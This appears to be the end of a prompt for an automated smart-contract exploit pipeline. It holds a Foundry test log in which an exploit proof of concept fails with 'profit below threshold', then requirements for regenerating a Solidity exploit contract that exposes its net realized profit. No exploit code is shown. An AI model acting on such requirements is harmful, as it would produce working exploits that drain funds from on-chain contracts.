    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3.underlying
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.70s (1.61s CPU time)

Ran 1 test suite in 1.78s (1.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1056724217)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
